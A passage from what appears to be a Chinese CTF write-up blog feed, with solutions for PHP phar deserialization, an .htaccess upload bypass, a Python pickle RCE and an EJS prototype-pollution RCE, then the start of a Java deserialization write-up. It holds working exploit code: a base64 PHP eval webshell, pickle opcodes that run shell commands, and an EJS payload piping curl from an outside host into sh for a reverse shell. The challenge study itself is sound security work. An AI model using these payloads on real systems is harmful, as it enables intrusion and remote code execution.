     <span class="variable">$arg</span>[<span class="number">1</span>] =<span class="variable language_">$this</span>-&gt;name-&gt;<span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">apple</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;xxx-&gt;<span class="variable">$flag</span> = <span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">tree</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">tree</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name = <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">apple</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">air</span>();</span><br><span class="line"><span class="variable">$e</span> = <span class="keyword">new</span> <span class="title function_ invoke__">tree</span>();</span><br><span class="line"><span class="variable">$e</span>-&gt;act = <span class="string">&quot;SplFileObject&quot;</span>;</span><br><span class="line"><span class="variable">$e</span>-&gt;name = <span class="string">&quot;Error&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;p = <span class="variable">$e</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;xxx = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;flag = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=/fflaggg&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;name = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$x</span> = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$array</span> = <span class="keyword">array</span>(<span class="variable">$a</span>,<span class="variable">$x</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">////unserialize(serialize($array));</span></span><br><span class="line"><span class="comment">//@unlink(&quot;phar.phar&quot;);</span></span><br><span class="line"><span class="comment">//$phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span></span><br><span class="line"><span class="comment">//$phar-&gt;startBuffering();</span></span><br><span class="line"><span class="comment">/*$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub*/</span></span><br><span class="line"><span class="comment">//$phar-&gt;setMetadata($array); //将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="comment">//$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span></span><br><span class="line"><span class="comment">////签名自动计算</span></span><br><span class="line"><span class="comment">//$phar-&gt;stopBuffering();</span></span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c9387777-447d-46ce-8295-66f80f1d49f9.node4.buuoj.cn:81/&quot;</span></span><br><span class="line">pic = <span class="built_in">open</span>(<span class="string">&quot;./flag.png&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">proxies = &#123;<span class="string">&quot;http&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;0&quot;</span>:pic,</span><br><span class="line">        <span class="string">&quot;1&quot;</span>:<span class="string">&#x27;O:1:&quot;D&quot;:1:&#123;s:5:&quot;start&quot;;s:1:&quot;w&quot;; &#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;0&quot;</span>:<span class="string">&quot;phar:///tmp/7e58c362cae57c86436a19f1d3781761.jpg&quot;</span>,</span><br><span class="line">        <span class="string">&quot;1&quot;</span>:<span class="string">&#x27;O:1:&quot;D&quot;:1:&#123;s:5:&quot;start&quot;;s:1:&quot;r&quot;; &#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(url=url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># upload()</span></span><br><span class="line"></span><br><span class="line">    read()</span><br></pre></td></tr></table></figure><p>phar用下面方法绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">新建.phar</span><br><span class="line">cd .phar</span><br><span class="line">新建matadata</span><br><span class="line">把处理过的序列化字符串加进去，下面是处理好的</span><br><span class="line">a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;O:<span class="number">4</span>:<span class="string">&quot;tree&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;tree&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;apple&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;xxx&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;air&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;p&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;tree&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;Error&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;act&quot;</span>;s:<span class="number">13</span>:<span class="string">&quot;SplFileObject&quot;</span>;&#125;&#125;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">57</span>:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=/fflaggg&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;act&quot;</span>;N;&#125;s:<span class="number">3</span>:<span class="string">&quot;act&quot;</span>;N;&#125;i:<span class="number">0</span>;i:<span class="number">0</span>;&#125;</span><br></pre></td></tr></table></figure><p>tar压缩，再用gizp压缩即可</p><h2 id="funny-upload"><a href="#funny-upload" class="headerlink" title="funny_upload"></a>funny_upload</h2><p><code>.htaccess</code></p><p>对文件后缀没有过滤</p><p>对内容有过滤</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220522163316-2op0kkw.png" alt="image.png"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>d5cf5b4b-0b56-4c7d-8ca0-0bbd7f22729d.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>357</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://d5cf5b4b-0b56-4c7d-8ca0-0bbd7f22729d.node4.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary65Yxb4VInKlwTfu7</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://d5cf5b4b-0b56-4c7d-8ca0-0bbd7f22729d.node4.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-maxima">------WebKitFormBoundary65Yxb4VInKlwTfu7</span></span><br><span class="line"><span class="language-maxima">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;1.jpg&quot;</span></span></span><br><span class="line"><span class="language-maxima">Content-Type: <span class="built_in">image</span>/jpeg</span></span><br><span class="line"><span class="language-maxima"></span></span><br><span class="line"><span class="language-maxima">#<span class="built_in">define</span> <span class="built_in">width</span> <span class="number">1337</span></span></span><br><span class="line"><span class="language-maxima">#<span class="built_in">define</span> <span class="built_in">height</span> <span class="number">1337</span></span></span><br><span class="line"><span class="language-maxima">APD9waHAgZXZhbCgkX1BPU1Rbd2hvYW1pXSk7Pz4=</span></span><br><span class="line"><span class="language-maxima"></span></span><br><span class="line"><span class="language-maxima">------WebKitFormBoundary65Yxb4VInKlwTfu7</span></span><br><span class="line"><span class="language-maxima">Content-Disposition: form-data; name=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="language-maxima"></span></span><br><span class="line"><span class="language-maxima">提交</span></span><br><span class="line"><span class="language-maxima">------WebKitFormBoundary65Yxb4VInKlwTfu7--</span></span><br><span class="line"><span class="language-maxima"></span></span><br><span class="line"><span class="language-maxima"></span></span><br><span class="line"><span class="language-maxima">POST / HTTP/<span class="number">1.1</span></span></span><br><span class="line"><span class="language-maxima">Host: d5cf5b4b-<span class="number">0b56</span>-4c7d-8ca0-<span class="number">0bbd7f22729d.</span>node4.buuoj.cn:<span class="number">81</span></span></span><br><span class="line"><span class="language-maxima">Content-Length: <span class="number">436</span></span></span><br><span class="line"><span class="language-maxima">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span></span><br><span class="line"><span class="language-maxima">Upgrade-Insecure-Requests: <span class="number">1</span></span></span><br><span class="line"><span class="language-maxima">Origin: http://d5cf5b4b-<span class="number">0b56</span>-4c7d-8ca0-<span class="number">0bbd7f22729d.</span>node4.buuoj.cn:<span class="number">81</span></span></span><br><span class="line"><span class="language-maxima">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary65Yxb4VInKlwTfu7</span></span><br><span class="line"><span class="language-maxima">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">101.0</span><span class="number">.4951</span><span class="number">.67</span> Safari/<span class="number">537.36</span></span></span><br><span class="line"><span class="language-maxima">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,<span class="built_in">image</span>/avif,<span class="built_in">image</span>/webp,<span class="built_in">image</span>/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">Referer: http://d5cf5b4b-0b56-4c7d-8ca0-0bbd7f22729d.node4.buuoj.cn:81/</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">Accept-Encoding: gzip, deflate</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">Connection: close</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima"></span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">------WebKitFormBoundary65Yxb4VInKlwTfu7</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;.htaccess&quot;</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">Content-Type: image/jpeg</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima"></span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">#define width 1337</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">#define height 1337</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">AddType application/x-httpd-php .jpg</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=1.jpg&quot;</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima"></span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">------WebKitFormBoundary65Yxb4VInKlwTfu7</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">Content-Disposition: form-data; name=&quot;1&quot;</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima"></span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">提交</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima">------WebKitFormBoundary65Yxb4VInKlwTfu7--</span></span></span><br><span class="line"><span class="comment"><span class="language-maxima"></span></span></span><br><span class="line"><span class="comment"><span class="language-maxima"></span></span></span><br><span class="line"><span class="comment"><span class="language-maxima"></span></span></span><br></pre></td></tr></table></figure><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220522163225-f3ot1w6.png" alt="image.png"></p><h2 id="middle"><a href="#middle" class="headerlink" title="middle"></a>middle</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, url_for,redirect,make_response</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">in</span> [<span class="string">&#x27;config&#x27;</span>] <span class="keyword">and</span> <span class="string">&quot;__&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[module], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    base_dir = os.path.dirname(__file__)</span><br><span class="line">    resp = make_response(<span class="built_in">open</span>(os.path.join(base_dir, __file__)).read()+<span class="built_in">open</span>(os.path.join(base_dir, <span class="string">&quot;config/__init__.py&quot;</span>)).read())</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-type&quot;</span>] = <span class="string">&quot;text/plain;charset=UTF-8&quot;</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    data=request.form[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line">    User = restricted_loads(base64.b64decode(data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(User)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">True</span>, port=<span class="number">5000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#config.py</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="comment"># 这里我也改了一下</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(cmd,<span class="built_in">list</span>) :</span><br><span class="line">        s=<span class="string">&#x27;&#x27;</span>.join(cmd)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;!!!!!!!!!!&quot;</span>)</span><br><span class="line">        s=<span class="built_in">eval</span>(s)</span><br><span class="line">        <span class="keyword">return</span> s</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;??????&quot;</span>)</span><br></pre></td></tr></table></figure><p>直接import config然后调用backdoor就行，中间该mark的mark，最后用抛出异常来读即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base64_encode</span>(<span class="params">s: <span class="built_in">str</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> b64encode(s.encode()).decode(encoding=encoding)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exc = <span class="string">&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;tac /*&#x27;).read())&quot;</span></span><br><span class="line">exc = base64_encode(exc).encode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;(cconfig</span></span><br><span class="line"><span class="string">backdoor</span></span><br><span class="line"><span class="string">(S&#x27;exec(__import__(&quot;base64&quot;).b64decode(b&quot;%s&quot;))&#x27;</span></span><br><span class="line"><span class="string">lo.&#x27;&#x27;&#x27;</span>% (exc)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(b64encode(opcode).decode()))</span><br></pre></td></tr></table></figure><h2 id="NodeSoEasy"><a href="#NodeSoEasy" class="headerlink" title="NodeSoEasy"></a>NodeSoEasy</h2><p>组件的话，除了ejs差了一个小版本其他都是最新的</p><p>ejs这里的漏洞加了过滤绕不开，但是也学习了一下<a href="https://eslam.io/posts/ejs-server-side-template-injection-rce/">CVE-2022-29078</a></p><p>修复：</p><p><a href="https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf">https://github.com/mde/ejs/commit/15ee698583c98dadc456639d6245580d17a24baf</a></p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220522235023-imzuorg.png" alt="image.png"></p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220522235003-k11pwyw.png" alt="image.png"></p><p><a href="http://suphp.cn/anquanke/54/236354.html">http://suphp.cn/anquanke/54/236354.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;view options&quot;</span>:&#123;<span class="string">&quot;client&quot;</span>:true,<span class="string">&quot;escapeFunction&quot;</span>:<span class="string">&quot;1; return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;curl https://your-shell.com/1.117.144.41:4444 | sh&#x27;);&quot;</span>,<span class="string">&quot;compileDebug&quot;</span>:true,<span class="string">&quot;debug&quot;</span>:true&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="Really-Easy-SQL-amp-Sql"><a href="#Really-Easy-SQL-amp-Sql" class="headerlink" title="Really Easy SQL&amp;Sql"></a>Really Easy SQL&amp;Sql</h2><p>两道比赛没出，属于是又卡在sql上了，听说之后群里给了hint，把黑名单给出来了，如下</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220531232131-75hc3ta.png" alt="image.png"></p><p>看了一些赛后的wp，发现其实当时没试出来的原因很有可能是hackbar或者burp传的时候没有对%0之类的url解码，因为他过滤了%0</p><p>下图中的%%0d是python中双写百分号起到转义的效果</p><p><a href="https://blog.csdn.net/yasi_xi/article/details/38355853">https://blog.csdn.net/yasi_xi&#x2F;article&#x2F;details&#x2F;38355853</a></p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220531233248-6geasfk.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">buu上的小比赛的一些题解</summary>
    
    
    
    <category term="ctfStudy" scheme="https://xianbeil.github.io/categories/ctfStudy/"/>
    
    
    <category term="wp" scheme="https://xianbeil.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>ciscn2021-ezj4va题解</title>
    <link href="https://xianbeil.github.io/2022/05/29/ciscn2021-ezj4va/"/>
    <id>https://xianbeil.github.io/2022/05/29/ciscn2021-ezj4va/</id>
    <published>2022-05-29T06:34:24.000Z</published>
    <updated>2022-06-02T00:37:08.693Z</updated>
    
    <content type="html"><![CDATA[<p>参考文章：</p><p><a href="https://forum.butian.net/share/337">https://forum.butian.net/share/337</a></p><p><a href="https://www.anquanke.com/post/id/249651">https://www.anquanke.com/post/id/249651</a></p><h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>访问robots.txt之后下载<a href="http://www.zip得到项目源码,用idea打开文件夹/">www.zip得到项目源码，用idea打开文件夹</a></p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220524205154-lxs1o3h.png" alt="image.png"></p><p>然后配maven和tomcat就行，注意最后需要用<code>ciscn.fina1.ezj4va.launch.Main</code>中的主方法启动</p><h2 id="0x02-审计"><a href="#0x02-审计" class="headerlink" title="0x02 审计"></a>0x02 审计</h2><p>反序列化点</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220524205906-qq5peow.png" alt="image.png"></p><p>看一下给的依赖：</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220524205945-03txt4i.png" alt="image.png"></p><p>下面构造链子</p><p>链子的后半部分可以用ysoserial中的<code>aspectjweaver</code>链子，完成任意文件写入，我们可以参照ysoserial中的写法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">SimpleCache</span>$StorableCachingMap.<span class="title function_">put</span>()</span><br><span class="line">   <span class="title class_">SimpleCache</span>$StorableCachingMap.<span class="title function_">writeToPath</span>()</span><br><span class="line">        <span class="title class_">FileOutputStream</span>.<span class="title function_">write</span>()</span><br></pre></td></tr></table></figure><p>从maven repo上下源码，定位到put方法那里</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220525190804-elumial.png" alt="image.png"></p><p>可以看到第一个参数是string，第二个是bytes</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220525190933-9i6z70n.png" alt="image.png"></p><p>因此我们通过控制put方法的参数就能写入任意数据，注意要写入的数据为byte数组即可。</p><hr><p>回到源码，找到CartServiceImpl#addToCart方法，其中对可控变量调用了put</p><p>其中key和entry.getValue().add(oldPrice)是可控的</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220525090021-bbg08pb.png" alt="image.png"><br /></p><p>cart为他给出的可反序列化的类。</p><p>而在<code>ciscn.fina1.ezj4va.controller.CartController#add</code>方法中则调用了这个方法</p><p>可以直接通过路由<code>&quot;/cart/add&quot;</code>访问到这个方法</p><p><img src="https://assets.b3logfile.com/siyuan/1642857713240/assets/image-20220525085949-6kjuwtl.png" alt="image.png"></p><h2 id="0x03-编写poc"><a href="#0x03-编写poc" class="headerlink" title="0x03 编写poc"></a>0x03 编写poc</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> 